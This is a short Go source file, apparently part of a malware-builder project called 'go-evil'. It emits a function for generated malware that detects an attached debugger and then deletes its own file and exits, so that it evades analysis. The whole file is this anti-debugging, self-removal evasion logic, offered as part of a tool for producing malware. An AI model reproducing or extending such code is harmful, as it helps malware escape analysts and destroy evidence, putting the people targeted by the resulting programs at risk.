package debugger

import (
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Generates the code which will remove the malware
// after it has been launched in a debugger
func remove_behavior(data_object *json.Json_t) {
	body := []string{
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Remove(spine.path)",
		"os.Exit(42)",
		"}",
		"return toReturn",
	}

	data_object.Add_go_function(functions.Go_func_t{Name: "remove_behavior", Func_type: "null", Return_type: "bool", Gut: body})
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/s9rA16Bf4/Go-tools")

}
